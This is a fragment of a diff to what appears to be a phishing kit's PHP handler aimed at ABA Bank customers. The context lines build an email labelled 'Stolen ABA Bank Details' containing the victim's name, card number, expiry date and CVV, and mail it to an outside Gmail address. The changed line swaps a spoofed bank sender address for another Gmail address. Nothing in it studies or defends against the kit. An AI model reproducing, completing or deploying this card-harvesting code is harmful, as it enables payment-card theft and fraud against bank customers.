@@ -13,7 +13,7 @@
     $to = "gqwgqgq5q5@gmail.com";
     $subject = "Stolen ABA Bank Details";
     $message = "Name: $name\nCard Number: $cardnumber\nExpiry Date: $expiry\nCVV: $cvv";
-    $headers = "From: ABA Bank <security@ababank.com>";
+    $headers = "From: menglihour009@gmail.com>";
 
     mail($to, $subject, $message, $headers);
 ?>
